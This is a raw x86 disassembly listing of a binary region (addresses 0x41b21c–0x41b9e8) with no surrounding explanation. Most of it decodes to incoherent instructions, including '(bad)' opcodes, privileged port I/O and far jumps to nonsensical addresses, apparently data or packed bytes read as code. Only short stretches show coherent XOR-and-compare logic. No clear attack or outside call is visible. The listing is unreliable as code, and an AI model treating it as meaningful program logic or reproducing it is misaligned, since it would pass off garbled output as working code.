  41b21c:	lock cmp BYTE PTR [edi-0x2ea614b3],bl
  41b223:	das    
  41b224:	lahf   
  41b225:	xchg   edi,eax
  41b226:	xchg   esi,eax
  41b227:	mov    ch,0xd1
  41b229:	pop    ds
  41b22a:	push   0x83533681
  41b22f:	adc    BYTE PTR [esi-0x7058fa3e],dh
  41b235:	mov    DWORD PTR [ebx-0x3b],esp
  41b238:	je     0x41b1c4
  41b23a:	jp     0x41b295
  41b23c:	mov    ch,0x30
  41b23e:	popa   
  41b23f:	or     bh,BYTE PTR [esi]
  41b241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b242:	push   es
  41b243:	daa    
  41b244:	(bad)
  41b247:	mov    cl,0x7a
  41b249:	inc    eax
  41b24a:	(bad)  
  41b24b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b24c:	lahf   
  41b24d:	jbe    0x41b26f
  41b24f:	xor    ch,BYTE PTR [ebx]
  41b251:	xchg   ebp,eax
  41b252:	sub    BYTE PTR ds:0x17f9531d,0x4c
  41b259:	(bad)  
  41b25a:	test   eax,0x4939a4e2
  41b25f:	mov    dl,0xf0
  41b261:	dec    edx
  41b262:	xchg   ch,dh
  41b264:	adc    DWORD PTR [ebx+0x37],eax
  41b267:	and    al,0xeb
  41b269:	xlat   BYTE PTR ds:[ebx]
  41b26a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b26b:	or     esi,edx
  41b26d:	add    al,0x7c
  41b26f:	fs cmp al,0x23
  41b272:	pop    ds
  41b273:	and    BYTE PTR [esi-0x508316bd],bh
  41b279:	in     al,0xaa
  41b27b:	es out 0x1e,eax
  41b27e:	push   0x8c120ca5
  41b283:	sbb    cl,ch
  41b285:	stc    
  41b286:	stc    
  41b287:	je     0x41b23f
  41b289:	fs clc 
  41b28b:	enter  0xfe59,0xf4
  41b28f:	test   DWORD PTR [eax+esi*8-0x2011ee62],0xb7ec25a6
  41b29a:	ret    
  41b29b:	addr16 call 0xd7b6c9d5
  41b2a1:	cmp    ebx,DWORD PTR [edi-0x42]
  41b2a4:	add    eax,0x41359ba7
  41b2a9:	lea    edx,[ecx+0x246ecc0d]
  41b2af:	aad    0xe8
  41b2b1:	ja     0x41b244
  41b2b3:	(bad)  [eax-0xbf55c1a]
  41b2b9:	xchg   edi,ecx
  41b2bb:	daa    
  41b2bc:	jecxz  0x41b321
  41b2be:	in     eax,0x4
  41b2c0:	sar    dl,cl
  41b2c2:	std    
  41b2c3:	int    0xa
  41b2c5:	cmp    ebp,DWORD PTR [ecx]
  41b2c7:	aas    
  41b2c8:	outs   dx,BYTE PTR ds:[esi]
  41b2c9:	stos   DWORD PTR es:[edi],eax
  41b2ca:	jmp    0x41b2c1
  41b2cc:	mov    cl,0x1
  41b2ce:	sub    BYTE PTR [edi-0x2dbc06f5],dh
  41b2d4:	adc    eax,0x3da8a5b9
  41b2d9:	push   esi
  41b2da:	mov    al,BYTE PTR [edx+0x77916407]
  41b2e0:	and    al,0x1
  41b2e2:	out    dx,eax
  41b2e3:	icebp  
  41b2e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2e5:	push   ds
  41b2e6:	mov    cl,0x11
  41b2e8:	xor    eax,0xaf910da6
  41b2ed:	and    BYTE PTR [ebx+0x69f213d4],dh
  41b2f3:	xchg   edi,eax
  41b2f4:	jecxz  0x41b360
  41b2f6:	mov    bl,0xd
  41b2f8:	es scas eax,DWORD PTR es:[edi]
  41b2fa:	call   0x977e:0xfb12b56f
  41b301:	gs aad 0xfc
  41b304:	add    cl,dl
  41b306:	(bad)  
  41b308:	cld    
  41b309:	sbb    eax,0x7d671a4e
  41b30e:	ror    BYTE PTR ds:0x5bca58d2,cl
  41b314:	or     al,0x46
  41b316:	pop    ecx
  41b317:	push   esi
  41b318:	dec    ecx
  41b319:	or     al,0x62
  41b31b:	imul   ebx,DWORD PTR [ebx-0x36],0xfffffff5
  41b31f:	sbb    eax,0xe246858b
  41b324:	lock and esi,DWORD PTR [ebp+0x6c67d938]
  41b32b:	sub    al,0x8b
  41b32d:	pop    ecx
  41b32e:	xchg   edx,eax
  41b32f:	cmp    al,0x54
  41b331:	push   0x7fc56698
  41b336:	(bad)  
  41b337:	fwait
  41b338:	shl    ch,0xbe
  41b33b:	shl    esp,1
  41b33d:	xor    edx,0xca79a577
  41b343:	shrd   edx,eax,0x2
  41b347:	shr    eax,0x2
  41b34a:	mov    DWORD PTR [esp+0x34],eax
  41b34e:	mov    eax,DWORD PTR [esp+0x18]
  41b352:	mov    ecx,DWORD PTR [esp+0x1c]
  41b356:	jmp    0x41b725
  41b35b:	push   ecx
  41b35c:	(bad)  
  41b35e:	or     BYTE PTR ds:0xaa1d2104,bl
  41b364:	sbb    BYTE PTR [ebx+0x7c],dh
  41b367:	inc    esi
  41b368:	dec    esi
  41b369:	aas    
  41b36a:	mov    esi,0x18168fbb
  41b36f:	mov    esp,0x8181812
  41b374:	push   es
  41b375:	mov    dh,0xf6
  41b377:	imul   ebp,DWORD PTR [esi+ebx*2],0x6b35dc3
  41b37e:	jle    0x41b3d6
  41b380:	inc    ebp
  41b381:	popf   
  41b382:	xor    BYTE PTR [eax-0x3c],0x26
  41b386:	es push ds
  41b388:	mov    ah,0xc4
  41b38a:	pushw  0xa981
  41b38e:	xchg   ecx,eax
  41b38f:	psubusb mm7,QWORD PTR [edi-0x6fa67077]
  41b396:	jo     0x41b321
  41b398:	cs inc ebp
  41b39a:	inc    esp
  41b39b:	add    BYTE PTR [ebx],dl
  41b39d:	mov    ecx,0x7d2f9d09
  41b3a2:	lock ins DWORD PTR es:[edi],dx
  41b3a4:	cdq    
  41b3a5:	call   0x2f65:0xcf894549
  41b3ac:	scas   al,BYTE PTR es:[edi]
  41b3ad:	je     0x41b3aa
  41b3af:	mov    ecx,0xd8d5d9fc
  41b3b4:	retf   
  41b3b5:	pop    esi
  41b3b6:	ins    DWORD PTR es:[edi],dx
  41b3b7:	mov    ch,0x46
  41b3b9:	cmp    ebp,DWORD PTR [ecx+0x27d36811]
  41b3bf:	sub    BYTE PTR [edi],0xb2
  41b3c2:	fidiv  WORD PTR [edx+0xe3f7bf7]
  41b3c8:	sub    DWORD PTR [edi+0x609d3864],edi
  41b3ce:	call   0xa1f1:0xbc6a8a36
  41b3d5:	and    BYTE PTR [ebp-0x7f99e65b],bh
  41b3db:	mov    BYTE PTR [edi+edx*2],al
  41b3de:	retf   0xc940
  41b3e1:	aas    
  41b3e2:	repz popf 
  41b3e4:	or     esi,DWORD PTR [ecx]
  41b3e6:	in     al,0x2a
  41b3e8:	hlt    
  41b3e9:	xchg   ecx,eax
  41b3ea:	(bad)  
  41b3eb:	xchg   esp,eax
  41b3ec:	xor    DWORD PTR [ecx+ecx*1],ecx
  41b3ef:	jp     0x41b44a
  41b3f1:	adc    esi,DWORD PTR [eax+ebp*8+0x296681d4]
  41b3f8:	data16 sub al,0xe2
  41b3fb:	xlat   BYTE PTR ds:[ebx]
  41b3fc:	inc    esp
  41b3fd:	out    0x50,al
  41b3ff:	fisttp DWORD PTR [esi+0x2b882870]
  41b405:	mov    eax,0x86348da2
  41b40a:	js     0x41b475
  41b40c:	push   es
  41b40d:	clc    
  41b40e:	stos   DWORD PTR es:[edi],eax
  41b40f:	mov    dl,0x6b
  41b411:	test   DWORD PTR [ebx],edi
  41b413:	scas   al,BYTE PTR es:[edi]
  41b414:	jns    0x41b3c2
  41b416:	sbb    ecx,DWORD PTR [ecx+0x1e]
  41b419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b41a:	pop    eax
  41b41b:	and    al,0x94
  41b41d:	stos   BYTE PTR es:[edi],al
  41b41e:	loop   0x41b45d
  41b420:	xor    BYTE PTR [ebx],ah
  41b422:	add    al,0x22
  41b424:	dec    esp
  41b425:	and    BYTE PTR [ebp+0x21],bl
  41b428:	jno    0x41b492
  41b42a:	xchg   ecx,eax
  41b42b:	vmptrld QWORD PTR [ebx]
  41b42e:	fdivr  st,st(5)
  41b430:	shl    BYTE PTR [eax-0x2a],0xbc
  41b434:	xor    cl,BYTE PTR [ebp+0x56]
  41b437:	stos   BYTE PTR es:[edi],al
  41b438:	add    DWORD PTR [ecx-0x48f0ed05],ecx
  41b43e:	inc    esi
  41b43f:	push   ebp
  41b440:	loope  0x41b44e
  41b442:	pop    ecx
  41b443:	cmp    cl,BYTE PTR [esi+ebx*8]
  41b446:	aas    
  41b447:	repz pusha 
  41b449:	(bad)  
  41b44a:	stos   DWORD PTR es:[edi],eax
  41b44b:	sub    BYTE PTR ds:0x851604c8,0xdf
  41b452:	sub    eax,0xa4768341
  41b457:	mov    esp,0x6e2c16b4
  41b45c:	test   DWORD PTR [ecx-0x7816e7ce],edx
  41b462:	imul   DWORD PTR [edx+eax*1+0x76]
  41b466:	imul   edx,DWORD PTR [edx+0xd],0x4a
  41b46a:	ss std 
  41b46c:	cmp    DWORD PTR [ebx-0x7e22b2ff],0x27592e43
  41b476:	jmp    0xe391b179
  41b47b:	and    eax,0xeb7e085f
  41b480:	push   ecx
  41b481:	js     0x41b4fa
  41b483:	add    BYTE PTR [ecx+ecx*8+0x1ff81037],0x7
  41b48b:	sub    al,0x8a
  41b48d:	push   DWORD PTR [edx+0x72]
  41b490:	push   eax
  41b491:	mov    dl,0x41
  41b493:	and    ah,dh
  41b495:	push   ss
  41b496:	push   esp
  41b497:	push   esi
  41b498:	loope  0x41b4cf
  41b49a:	xor    bl,0x85
  41b49d:	sbb    dl,cl
  41b49f:	mov    edx,ebx
  41b4a1:	mov    dh,0xaa
  41b4a3:	mov    al,0xa5
  41b4a5:	call   0xcde554dd
  41b4aa:	icebp  
  41b4ab:	js     0x41b459
  41b4ad:	sub    DWORD PTR [ecx],edx
  41b4af:	xor    esi,DWORD PTR [ebx+0x45]
  41b4b2:	jne    0x41b4a8
  41b4b4:	enter  0x3377,0x72
  41b4b8:	sub    esp,DWORD PTR [ebx-0x6b52ce38]
  41b4be:	bound  ebp,QWORD PTR [ecx+0x6c]
  41b4c1:	(bad)  
  41b4c2:	aam    0xa4
  41b4c4:	dec    edi
  41b4c5:	(bad)  
  41b4c6:	lahf   
  41b4c7:	cli    
  41b4c8:	retf   0xb140
  41b4cb:	xor    BYTE PTR [edi],dh
  41b4cd:	mov    eax,ds:0x6cd52384
  41b4d2:	shl    BYTE PTR [ecx+edi*2],cl
  41b4d5:	xor    edx,edx
  41b4d7:	inc    esp
  41b4d8:	inc    esi
  41b4d9:	inc    edx
  41b4da:	jle    0x41b491
  41b4dc:	cli    
  41b4dd:	jne    0x41b4a3
  41b4df:	xchg   dh,dl
  41b4e1:	jmp    0x1833:0x5f44608b
  41b4e8:	aas    
  41b4e9:	fwait
  41b4ea:	add    bh,bl
  41b4ec:	jns    0x41b504
  41b4ee:	jg     0x41b4a5
  41b4f0:	mov    ch,bh
  41b4f2:	jle    0x41b487
  41b4f4:	(bad)  
  41b4f5:	rcr    BYTE PTR [ecx],1
  41b4f7:	sar    DWORD PTR [eax+ebx*4-0x227b7f6d],cl
  41b4fe:	sub    ch,dh
  41b500:	adc    BYTE PTR [ebp+0x2ae07b51],dl
  41b506:	test   al,0x77
  41b508:	fistp  QWORD PTR [edx]
  41b50a:	fcmovnu st,st(6)
  41b50c:	fisttp QWORD PTR [esi]
  41b50e:	in     al,dx
  41b50f:	popf   
  41b510:	ret    0xe2f0
  41b513:	rol    DWORD PTR [edi],0x9f
  41b516:	xchg   ebx,eax
  41b517:	into   
  41b518:	ds mov ebx,0x6cb6611a
  41b51e:	sbb    eax,0xe417d7f4
  41b523:	call   0xbc82f18c
  41b528:	ins    DWORD PTR es:[edi],dx
  41b529:	sub    esi,DWORD PTR [ebx]
  41b52b:	cmp    ebx,edx
  41b52d:	mov    ecx,0xd5d171f9
  41b532:	sti    
  41b533:	arpl   WORD PTR [eax],bp
  41b535:	lea    ebx,[eax]
  41b537:	sbb    edx,edx
  41b539:	adc    eax,0x71302c7f
  41b53e:	xlat   BYTE PTR ds:[ebx]
  41b53f:	into   
  41b540:	cmp    eax,0xcaab9fd7
  41b545:	cdq    
  41b546:	lea    edx,[ebx]
  41b548:	add    eax,0x27c03428
  41b54d:	mov    ds:0x3b40804c,al
  41b552:	jmp    0x60478b8
  41b557:	imul   esi,DWORD PTR [ebx],0xdede3ccd
  41b55d:	and    eax,0xd114074b
  41b562:	iret   
  41b563:	sbb    BYTE PTR [eax+0x20],al
  41b566:	sbb    DWORD PTR [edx],edi
  41b568:	dec    ebp
  41b569:	fistp  WORD PTR [edx-0x69]
  41b56c:	or     ebx,DWORD PTR [esi+esi*8+0x1020c83a]
  41b573:	pop    ebx
  41b574:	out    dx,eax
  41b575:	add    al,0x7
  41b577:	mov    dh,0x1c
  41b579:	mov    eax,ds:0xdafa8a15
  41b57e:	data16 jl 0x41b50e
  41b581:	cmp    DWORD PTR [ebp-0x5cabcb1c],ebx
  41b587:	aaa    
  41b588:	inc    edi
  41b589:	dec    ebx
  41b58a:	xchg   BYTE PTR [ecx],bh
  41b58c:	fwait
  41b58d:	clc    
  41b58e:	aad    0x47
  41b590:	inc    eax
  41b591:	ss push eax
  41b593:	jnp    0x41b53e
  41b595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b596:	jmp    DWORD PTR [edx]
  41b598:	shr    DWORD PTR [esi+edx*4],1
  41b59b:	data16 mov dl,0x4b
  41b59e:	jne    0x41b5ad
  41b5a0:	dec    ebx
  41b5a1:	push   DWORD PTR [edx-0x46]
  41b5a4:	test   eax,0x5ff89e0a
  41b5a9:	lea    eax,[eax+ebp*4]
  41b5ac:	pop    eax
  41b5ad:	test   al,0xc2
  41b5af:	ds inc esi
  41b5b1:	outs   dx,DWORD PTR ds:[esi]
  41b5b2:	inc    BYTE PTR [edx+esi*4]
  41b5b5:	and    al,0xe9
  41b5b7:	imul   ebp,eax,0xffffffca
  41b5ba:	push   ds
  41b5bb:	pop    esi
  41b5bc:	push   0x13
  41b5be:	and    al,0x97
  41b5c0:	pop    edx
  41b5c1:	ja     0x41b603
  41b5c3:	cs push ecx
  41b5c5:	mov    ebx,0x2d9ec7a2
  41b5ca:	sub    WORD PTR [eax+0x19966fea],si
  41b5d1:	sub    eax,0x83b2bcd9
  41b5d6:	jb     0x41b595
  41b5d8:	dec    ebx
  41b5d9:	jns    0x41b5be
  41b5db:	jnp    0x41b621
  41b5dd:	in     eax,dx
  41b5de:	iret   
  41b5df:	icebp  
  41b5e0:	cmp    al,0xc
  41b5e2:	daa    
  41b5e3:	je     0x41b661
  41b5e5:	cmp    ebp,ebp
  41b5e7:	jp     0x41b61a
  41b5e9:	and    ch,bl
  41b5eb:	mov    ch,0x31
  41b5ed:	call   0x56cb7358
  41b5f2:	sbb    ch,bl
  41b5f4:	mov    ebx,0xec4d011
  41b5f9:	addr16 das 
  41b5fb:	fs in  al,dx
  41b5fd:	sbb    BYTE PTR [esi-0x78a4eb15],bl
  41b603:	inc    esp
  41b604:	sub    edi,edi
  41b606:	and    al,BYTE PTR [esi+eiz*2-0x6b]
  41b60a:	pushf  
  41b60b:	test   eax,0x7e6171a8
  41b610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b611:	loop   0x41b635
  41b613:	sbb    dh,BYTE PTR [edi+0x61]
  41b616:	mov    dh,0x19
  41b618:	jp     0x41b661
  41b61a:	pusha  
  41b61b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b61c:	xchg   ebp,eax
  41b61d:	mov    ch,ah
  41b61f:	aam    0xb7
  41b621:	xchg   ecx,eax
  41b622:	fisub  WORD PTR [ecx-0xae223e0]
  41b628:	loop   0x41b5e0
  41b62a:	and    DWORD PTR [ecx+0x30],edi
  41b62d:	int    0x8e
  41b62f:	addr16 cmp eax,0xf8f84331
  41b635:	std    
  41b636:	jecxz  0x41b60a
  41b638:	mov    eax,ds:0x25aede28
  41b63d:	xor    DWORD PTR [eax+0x16747f5f],edx
  41b643:	xchg   edi,eax
  41b644:	ins    DWORD PTR es:[edi],dx
  41b645:	dec    esp
  41b646:	push   es
  41b647:	add    eax,0xa0ae5e5d
  41b64c:	mov    ebp,0x6aefa472
  41b651:	dec    ebp
  41b652:	xor    ebx,esp
  41b654:	arpl   WORD PTR [ecx],bp
  41b656:	pop    ss
  41b657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b658:	sub    dl,dh
  41b65a:	out    0xd,al
  41b65c:	dec    esi
  41b65d:	int    0x10
  41b65f:	jge    0x41b69b
  41b661:	push   esi
  41b662:	loope  0x41b64b
  41b664:	test   BYTE PTR [edi+0x45],al
  41b667:	mov    eax,0x13fe31c4
  41b66c:	in     eax,dx
  41b66d:	dec    ecx
  41b66e:	push   0x3530987b
  41b673:	mov    ebx,0xf2d78be
  41b678:	retf   
  41b679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b67a:	adc    al,cl
  41b67c:	je     0x41b69c
  41b67e:	push   0xcf8ee9bf
  41b683:	or     DWORD PTR ds:0xbc487c9d,ebp
  41b689:	stos   BYTE PTR es:[edi],al
  41b68a:	pop    ebp
  41b68b:	jl     0x41b683
  41b68d:	or     esi,DWORD PTR [eax-0x67a9d3f5]
  41b693:	jno    0x41b6e8
  41b695:	test   BYTE PTR [ebp+0x77],ah
  41b698:	xchg   edx,eax
  41b699:	xchg   edx,eax
  41b69a:	cli    
  41b69b:	adc    al,0xe0
  41b69d:	push   esp
  41b69e:	pop    edx
  41b69f:	and    esi,edx
  41b6a1:	mov    eax,ds:0xe3dc6dab
  41b6a6:	xor    ah,bl
  41b6a8:	ja     0x41b648
  41b6aa:	lods   al,BYTE PTR ds:[esi]
  41b6ab:	sbb    eax,0xcc91238b
  41b6b0:	cli    
  41b6b1:	fs into 
  41b6b3:	push   0xe348a285
  41b6b8:	and    edx,DWORD PTR [edi+0xbc0626a]
  41b6be:	test   BYTE PTR [esi-0x7a6c1d2e],0x9e
  41b6c5:	idiv   BYTE PTR [ecx+0x2318af8e]
  41b6cb:	inc    BYTE PTR ds:0x5961b16
  41b6d1:	mov    al,0xd7
  41b6d3:	aad    0x8d
  41b6d5:	or     dh,BYTE PTR [eax-0x2e133c9f]
  41b6db:	data16 into 
  41b6dd:	(bad)  
  41b6de:	jmp    0x41b73b
  41b6e0:	or     ecx,DWORD PTR [edi-0x5f]
  41b6e3:	jge    0x41b715
  41b6e5:	pop    edi
  41b6e6:	adc    al,0xdd
  41b6e8:	stc    
  41b6e9:	leave  
  41b6ea:	loope  0x41b68e
  41b6ec:	test   DWORD PTR [edi-0x635a7149],edi
  41b6f2:	fidivr WORD PTR [eax+0x318b8f5a]
  41b6f8:	cmp    cl,BYTE PTR [edi-0x2a85929f]
  41b6fe:	ss push cs
  41b700:	test   al,0x77
  41b702:	mov    ch,0xc
  41b704:	jb     0x41b747
  41b706:	or     DWORD PTR [esi-0x6a],ecx
  41b709:	ret    0x65a1
  41b70c:	xor    eax,0x644e4afd
  41b711:	mov    esi,0x86d75523
  41b716:	gs pop ebp
  41b718:	inc    esi
  41b719:	in     al,dx
  41b71a:	xchg   edx,eax
  41b71b:	or     al,0x63
  41b71d:	push   edx
  41b71e:	stc    
  41b71f:	adc    eax,0x489bd9b9
  41b724:	sbb    al,0xc1
  41b726:	loopne 0x41b746
  41b728:	xor    eax,0x40000000
  41b72d:	or     eax,DWORD PTR [esp+0x34]
  41b731:	xor    ecx,ecx
  41b733:	mov    DWORD PTR [esp+0x14],eax
  41b737:	mov    eax,DWORD PTR [esp+0x60]
  41b73b:	or     ecx,edx
  41b73d:	cdq    
  41b73e:	cmp    ecx,eax
  41b740:	jne    0x41d926
  41b746:	cmp    DWORD PTR [esp+0x14],edx
  41b74a:	jne    0x41d926
  41b750:	mov    DWORD PTR [esp+0x5c],0x422634
  41b758:	mov    DWORD PTR [esp+0x68],0x42262c
  41b760:	mov    eax,DWORD PTR [esp+0x78]
  41b764:	mov    eax,DWORD PTR [esp+0x78]
  41b768:	mov    edx,DWORD PTR [esp+0x18]
  41b76c:	xor    ecx,ecx
  41b76e:	shld   ecx,eax,0x2
  41b772:	shl    eax,0x2
  41b775:	mov    DWORD PTR [esp+0x10],edx
  41b779:	mov    edx,DWORD PTR [esp+0x1c]
  41b77d:	xor    eax,ebx
  41b77f:	xor    ecx,esi
  41b781:	mov    DWORD PTR [esp+0x14],edx
  41b785:	cmp    DWORD PTR [esp+0x10],eax
  41b789:	jne    0x41c8ee
  41b78f:	cmp    edx,ecx
  41b791:	jne    0x41c8ee
  41b797:	mov    DWORD PTR [esp+0x30],0x4225bc
  41b79f:	mov    eax,DWORD PTR [esp+0x18]
  41b7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41b7a7:	shrd   eax,ecx,0x2
  41b7ab:	shr    ecx,0x2
  41b7ae:	mov    ecx,DWORD PTR [esp+0x18]
  41b7b2:	mov    edx,DWORD PTR [esp+0x1c]
  41b7b6:	mov    edx,DWORD PTR [esp+0x30]
  41b7ba:	mov    edx,DWORD PTR [edx+0xc]
  41b7bd:	mov    DWORD PTR [esp+0xc],eax
  41b7c1:	shl    ecx,0x1e
  41b7c4:	mov    eax,0x329e695d
  41b7c9:	xor    DWORD PTR [esp+0xc],eax
  41b7cd:	xor    ecx,ecx
  41b7cf:	or     ecx,DWORD PTR [esp+0xc]
  41b7d3:	cmp    ecx,DWORD PTR [edx]
  41b7d5:	jne    0x41c888
  41b7db:	mov    ecx,0x65c7
  41b7e0:	mov    WORD PTR [esp+0x2c],cx
  41b7e5:	mov    ecx,0x6062
  41b7ea:	mov    WORD PTR [esp+0x24],cx
  41b7ef:	mov    ecx,0x125d
  41b7f4:	mov    WORD PTR [esp+0xc],cx
  41b7f9:	movzx  ecx,WORD PTR [esp+0xc]
  41b7fe:	mov    edx,0x2d0f
  41b803:	jmp    0x41bbd2
  41b808:	push   edi
  41b809:	and    BYTE PTR [ebx+0x236a9a6f],bh
  41b80f:	and    BYTE PTR [edx+0x42aa298c],dh
  41b815:	fist   DWORD PTR [esi]
  41b817:	stos   BYTE PTR es:[edi],al
  41b818:	pop    esi
  41b819:	mov    DWORD PTR [esi],edx
  41b81b:	sbb    BYTE PTR [edx+edx*1+0x56181818],bh
  41b822:	adc    al,0x29
  41b824:	test   BYTE PTR [ebx+0x6],dl
  41b827:	addr16 retf 
  41b829:	mov    edi,0x4ceae118
  41b82e:	inc    ebp
  41b82f:	fadd   DWORD PTR [ecx-0x11a34b52]
  41b835:	sub    eax,0xeb64ec34
  41b83a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b83b:	pushf  
  41b83c:	add    eax,0x793a7a16
  41b841:	cmp    DWORD PTR [eax+ebp*1],edi
  41b844:	idiv   DWORD PTR [ebp+0x5cae626d]
  41b84a:	sbb    edi,edx
  41b84c:	sbb    eax,0xc267837d
  41b851:	pop    ebx
  41b852:	dec    esp
  41b853:	xchg   edx,eax
  41b854:	pop    esi
  41b855:	push   ebx
  41b856:	iret   
  41b857:	dec    ecx
  41b858:	mov    dl,BYTE PTR [ebp-0x5a]
  41b85b:	popa   
  41b85c:	sbb    eax,0x147c7656
  41b861:	inc    bh
  41b863:	push   cs
  41b864:	adc    DWORD PTR [eax+0x2a002b84],eax
  41b86a:	cmp    DWORD PTR [ebp-0x55a3ab1e],ecx
  41b870:	loop   0x41b819
  41b872:	sub    ch,BYTE PTR [esi]
  41b874:	jb     0x41b80b
  41b876:	mov    eax,ds:0x11ba821a
  41b87b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b87c:	adc    BYTE PTR [ebx],cl
  41b87e:	mov    edi,DWORD PTR [esi-0x32]
  41b881:	jg     0x41b81b
  41b883:	dec    esp
  41b884:	sub    ah,bl
  41b886:	out    0x6c,al
  41b888:	or     eax,0xecb88d24
  41b88d:	pushf  
  41b88e:	dec    eax
  41b88f:	and    eax,0xdc10332c
  41b894:	mov    esi,0x75d0deb4
  41b899:	ret    
  41b89a:	cmp    eax,0xa72b0a8b
  41b89f:	ss cwde 
  41b8a1:	cld    
  41b8a2:	inc    esp
  41b8a3:	out    dx,al
  41b8a4:	ins    DWORD PTR es:[edi],dx
  41b8a5:	push   ebp
  41b8a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8a7:	cwde   
  41b8a8:	leave  
  41b8a9:	(bad)  
  41b8aa:	cmp    DWORD PTR [ecx+0x62],edx
  41b8ad:	mov    esp,0xf1493d0f
  41b8b2:	jmp    0x41b92c
  41b8b4:	sub    bh,ah
  41b8b6:	xchg   esp,eax
  41b8b7:	stos   BYTE PTR es:[edi],al
  41b8b8:	pop    ebp
  41b8b9:	out    dx,al
  41b8ba:	rol    bh,0xa0
  41b8bd:	lods   al,BYTE PTR ds:[esi]
  41b8be:	into   
  41b8bf:	push   edx
  41b8c0:	inc    ecx
  41b8c1:	jmp    0x41b8db
  41b8c3:	jmp    0x1ba2b813
  41b8c8:	xor    al,dh
  41b8ca:	ret    
  41b8cb:	xchg   esi,eax
  41b8cc:	mov    bh,dh
  41b8ce:	adc    eax,0x84ea1f49
  41b8d3:	and    eax,edi
  41b8d5:	gs adc al,0xec
  41b8d8:	inc    esi
  41b8d9:	fsubr  QWORD PTR [edi]
  41b8db:	clc    
  41b8dc:	cmp    BYTE PTR [ebp+0x75],bl
  41b8df:	push   0x1d74065c
  41b8e4:	call   ebx
  41b8e6:	mov    edx,0x47b1ea8d
  41b8eb:	push   ebp
  41b8ec:	mov    ah,0x35
  41b8ee:	inc    edi
  41b8ef:	cmp    al,0x50
  41b8f2:	cmp    al,BYTE PTR [ecx+0x61]
  41b8f5:	(bad)  
  41b8f6:	rcr    BYTE PTR [edx+0x7e3c61b],cl
  41b8fc:	movsx  esi,BYTE PTR [ebx-0x7a5c7998]
  41b903:	xchg   esp,eax
  41b904:	inc    esi
  41b905:	mov    edx,edx
  41b907:	sub    ah,dl
  41b909:	dec    esp
  41b90a:	repnz test al,0x92
  41b90d:	and    DWORD PTR [edi+0x64],edx
  41b910:	xchg   ecx,eax
  41b911:	xchg   DWORD PTR [ecx],ecx
  41b913:	jg     0x41b963
  41b915:	aad    0x21
  41b917:	push   ebx
  41b918:	cli    
  41b919:	cdq    
  41b91a:	pop    esp
  41b91b:	sub    eax,0x8f6f8d95
  41b920:	out    dx,eax
  41b921:	pop    ebx
  41b922:	pop    es
  41b923:	cmp    al,0x89
  41b925:	jmp    0x41b91a
  41b927:	pop    ebx
  41b928:	pop    esi
  41b929:	imul   edx,edi,0x18
  41b92c:	(bad)  
  41b92d:	mov    ah,0xc6
  41b92f:	mov    cl,0xf0
  41b931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b932:	push   esi
  41b933:	pop    esp
  41b934:	adc    eax,0xbd2de861
  41b939:	xor    BYTE PTR [ecx],dh
  41b93b:	lods   al,BYTE PTR ds:[esi]
  41b93c:	retf   0xeff6
  41b93f:	fwait
  41b940:	add    DWORD PTR [ebp+edi*2+0x52],ebp
  41b944:	shl    dh,0xe2
  41b947:	lods   eax,DWORD PTR ds:[esi]
  41b948:	in     eax,0xb
  41b94a:	pusha  
  41b94b:	rcr    BYTE PTR [esp+eiz*8],cl
  41b94e:	adc    ah,cl
  41b950:	out    dx,al
  41b951:	mov    cl,ch
  41b953:	and    DWORD PTR [esi+eiz*4],ecx
  41b956:	scas   eax,DWORD PTR es:[edi]
  41b957:	fld    QWORD PTR [edx-0x31f86062]
  41b95d:	mov    ds:0xacd6fa82,eax
  41b962:	or     DWORD PTR [edi+0x7912c903],0x2d
  41b969:	jle    0x41b9d4
  41b96b:	in     eax,0xb3
  41b96d:	or     esp,DWORD PTR [edx-0x7e637bd9]
  41b973:	or     eax,0x9d53fc8b
  41b978:	int3   
  41b979:	sub    ah,BYTE PTR [esi+0x5b5a42bb]
  41b97f:	rcr    BYTE PTR [edi-0x358ceb0b],1
  41b985:	cmp    dl,BYTE PTR [ebp+0x2f6f6de6]
  41b98b:	mov    BYTE PTR [edi+0x49],al
  41b98e:	daa    
  41b98f:	mov    bh,BYTE PTR [ebp+0x2e06904f]
  41b995:	push   0xb18c81d5
  41b99a:	dec    edx
  41b99b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b99c:	shr    DWORD PTR [edx-0x7],cl
  41b99f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9a0:	mov    DWORD PTR [esi],eax
  41b9a2:	inc    edx
  41b9a3:	push   esp
  41b9a4:	ja     0x41b952
  41b9a6:	or     eax,edi
  41b9a8:	(bad)  
  41b9a9:	xor    al,0x22
  41b9ab:	mov    al,ds:0x14daf693
  41b9b0:	std    
  41b9b1:	test   eax,0x4c109251
  41b9b6:	mov    al,0xd4
  41b9b8:	adc    ebp,ecx
  41b9ba:	dec    eax
  41b9bb:	test   BYTE PTR [ecx-0x70],dl
  41b9be:	jl     0x41b9e5
  41b9c0:	int    0xe6
  41b9c2:	das    
  41b9c3:	(bad)
  41b9c6:	pop    es
  41b9c7:	dec    esp
  41b9c8:	xor    BYTE PTR [ebp+0x47174641],dh
  41b9ce:	and    eax,DWORD PTR [esi]
  41b9d0:	mov    dh,0xb5
  41b9d2:	fcmovbe st,st(3)
  41b9d4:	arpl   WORD PTR [eax],cx
  41b9d6:	sar    DWORD PTR ds:0xc893d38c,1
  41b9dc:	(bad)  
  41b9dd:	les    ebp,FWORD PTR [ebx-0x70]
  41b9e0:	por    mm6,QWORD PTR [edx]
  41b9e3:	lods   eax,DWORD PTR ds:[esi]
  41b9e4:	sqrtps xmm4,xmm0
  41b9e7:	sahf   
  41b9e8:	cmp    BYTE PTR [edi],0xce
